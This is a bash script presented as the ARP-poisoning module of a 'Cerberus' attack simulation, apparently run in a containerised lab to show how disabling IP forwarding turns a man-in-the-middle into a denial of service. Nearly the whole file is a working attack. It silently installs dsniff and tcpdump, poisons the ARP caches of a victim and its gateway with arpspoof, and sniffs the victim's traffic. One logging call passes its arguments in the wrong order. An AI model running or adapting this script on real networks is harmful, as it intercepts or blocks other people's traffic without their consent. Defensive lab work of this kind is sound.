#!/bin/bash
# CERBERUS ATTACK MODULE: ARP POISONING (MITM)
# Respects the current Hardening State to demonstrate impact.

if [ -d "/app/reports" ]; then LOG_DIR="/app/reports"; else LOG_DIR="./reports"; fi
LOG_FILE="$LOG_DIR/audit_$(date +%F).log"

log_event() {
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "{\"timestamp\": \"$TIMESTAMP\", \"event_type\": \"$1\", \"severity\": \"$2\", \"target\": \"172.20.0.20\", \"message\": \"$3\", \"threat_score\": $4}" >> "$LOG_FILE"
}

# INSTALL DEPENDENCIES (Silent)
if ! command -v arpspoof >/dev/null 2>&1; then
    echo "[*] Initializing Attack Tools..."
    apt-get update >/dev/null 2>&1 && apt-get install -y dsniff tcpdump >/dev/null 2>&1
fi

clear
echo "========================================================"
echo " CERBERUS: INTERNAL ATTACK SIMULATION (ARP)"
echo "========================================================"

# --- 1. CHECK CURRENT STATE (Do not force it!) ---
CURRENT_STATE=$(cat /proc/sys/net/ipv4/ip_forward)

if [ "$CURRENT_STATE" -eq 1 ]; then
    echo -e "[MODE] System is \e[31mVULNERABLE\e[0m (Forwarding ON)"
    echo "       -> Result: MITM Attack (Spying on traffic)"
    MSG="MITM Spying Active"
else
    echo -e "[MODE] System is \e[32mHARDENED\e[0m (Forwarding OFF)"
    echo "       -> Result: DoS Attack (Traffic will be BLOCKED)"
    MSG="DoS Blocked Traffic"
fi

echo "--------------------------------------------------------"
echo -e "\033[1;31m[!] LAUNCHING ATTACK...\033[0m"
log_event "ATTACK_START" "ARP Poisoning initiated ($MSG)" "CRITICAL" 90

# 2. POISON THE NETWORK
# We poison the Victim (X) and the Gateway (Y)
arpspoof -i eth0 -t 172.20.0.20 172.20.0.1 > /dev/null 2>&1 &
PID_1=$!
arpspoof -i eth0 -t 172.20.0.1 172.20.0.20 > /dev/null 2>&1 &
PID_2=$!

# 3. SNIFF TRAFFIC
# If Hardened, you won't see much return traffic here (Proof of defense)
tcpdump -i eth0 host 172.20.0.20 and not port 22 -n &
PID_DUMP=$!

echo "--------------------------------------------------------"
echo "    [ACTIVE] Intercepting traffic..."
echo "    [CTRL+C] or Press ENTER to stop."
read -r _

# 4. CLEANUP
echo "[*] Stopping Attack..."
kill $PID_1 $PID_2 $PID_DUMP > /dev/null 2>&1
wait $PID_DUMP 2>/dev/null

log_event "ATTACK_STOP" "ARP Poisoning terminated." "INFO" 0

echo "[+] Attack Stopped. State preserved."
echo "========================================================"
read -p "Press Enter to return..."